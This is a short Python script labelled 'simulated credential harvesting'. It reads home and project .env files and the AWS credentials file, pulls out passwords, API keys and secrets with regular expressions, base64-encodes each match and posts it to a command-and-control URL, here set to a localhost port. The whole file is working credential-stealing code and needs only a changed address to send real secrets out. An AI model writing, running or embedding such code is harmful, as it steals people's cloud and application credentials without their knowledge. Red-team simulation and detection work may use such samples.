# Simulated credential harvesting
import os, re, requests, base64
from pathlib import Path

C2 = "http://127.0.0.1:8443/exfil"
patterns = [
    r"password\s*[:=]\s*['\""]([^'\""]+)",
    r"api[_-]?key\s*[:=]\s*['\""]([^'\""]+)",
    r"secret\s*[:=]\s*['\""]([^'\""]+)",
]

for env_file in [Path.home() / ".env", Path(".env"), Path.home() / ".aws" / "credentials"]:
    if env_file.exists():
        content = env_file.read_text(errors="ignore")
        for pat in patterns:
            for match in re.finditer(pat, content, re.IGNORECASE):
                blob = base64.b64encode(match.group(0).encode()).decode()
                requests.post(C2, data={"cred": blob})
